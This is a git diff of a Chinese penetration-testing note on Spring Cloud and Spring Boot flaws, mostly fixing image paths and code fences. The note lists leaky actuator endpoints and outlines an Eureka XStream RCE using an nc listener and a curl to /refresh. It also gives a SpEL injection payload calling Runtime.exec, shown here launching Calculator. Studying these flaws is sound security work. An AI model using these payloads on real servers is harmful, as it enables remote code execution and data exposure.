@@ -6,6 +6,7 @@ Spring Cloud基于Spring Boot，为微服务体系开发中的架构问题，提
 
 ## 信息泄露
 
+```
 常见信息泄露接口
 
 /api-docs
@@ -75,6 +76,7 @@ Spring Cloud基于Spring Boot，为微服务体系开发中的架构问题，提
  /actuator/mappings
  /actuator/jolokia
  /actuator/hystrix.stream
+```
 
 **重点接口**
 
@@ -82,11 +84,13 @@ Spring Cloud基于Spring Boot，为微服务体系开发中的架构问题，提
 
   GET 请求 /env 会泄露环境变量信息，
 
-  ![image-20200826152011139](/Users/shadowflow/Library/Application Support/typora-user-images/image-20200826152011139.png)
+  ![image-20200826153831974](pictures/image-20200826153831974.png)
 
 同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，触发相关 RCE 漏洞。
 
-下图是eureka xstream deserialization 实现RCE![image-20200826152031945](/Users/shadowflow/Library/Application Support/typora-user-images/image-20200826152031945.png)
+下图是eureka xstream deserialization 实现RCE
+
+![image-20200826153817583](pictures/image-20200826153817583.png)
 
 - /jolokia
 
@@ -172,11 +176,11 @@ if __name__ == "__main__":
 
 （2）在vps上运行flak_xtream.py
 
-![image-20200826152255541](/Users/shadowflow/Library/Application Support/typora-user-images/image-20200826152255541.png)
+![image-20200826153752125](pictures/image-20200826153752125.png)
 
 (3)nc监听command标签内的端口
 
-![image-20200826152318056](/Users/shadowflow/Library/Application Support/typora-user-images/image-20200826152318056.png)
+![image-20200826153730043](pictures/image-20200826153730043.png)
 
 （3）分别发两次POST数据包
 
@@ -184,11 +188,11 @@ if __name__ == "__main__":
 >
 > curl "http://targetIp:60689/refresh" -d ""
 
-![image-20200826152402682](/Users/shadowflow/Library/Application Support/typora-user-images/image-20200826152402682.png)
+![image-20200826153708980](pictures/image-20200826153708980.png)
 
 （4）成功执行命令。
 
-![image-20200826152421627](/Users/shadowflow/Library/Application Support/typora-user-images/image-20200826152421627.png)
+![image-20200826153652517](pictures/image-20200826153652517.png)
 
 # Spring Boot SpEL表达式注入
 
@@ -211,7 +215,7 @@ Spring Boot 框架Whitelabel Error Page SpEL注入的原因就是系统报错页
 
 （2）输入 /article?id=${7*7} ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。
 
-![image-20200826152505288](/Users/shadowflow/Library/Application Support/typora-user-images/image-20200826152505288.png)
+![image-20200826153629050](pictures/image-20200826153629050.png)
 
 （3）格式转换以便于执行任意代码
 
@@ -226,6 +230,17 @@ print(result.rstrip(','))
 ```
 
 插入生成的十六进制码
-${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
 
-![image-20200826152622735](/Users/shadowflow/Library/Application Support/typora-user-images/image-20200826152622735.png)
+```
+${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
+```
+
+![image-20200826153918277](pictures/image-20200826153918277.png)
+
+![image-20200826153941720](pictures/image-20200826153941720.png)
+
+
+
+**参考**
+
+https://github.com/LandGrey/SpringBootVulExploit
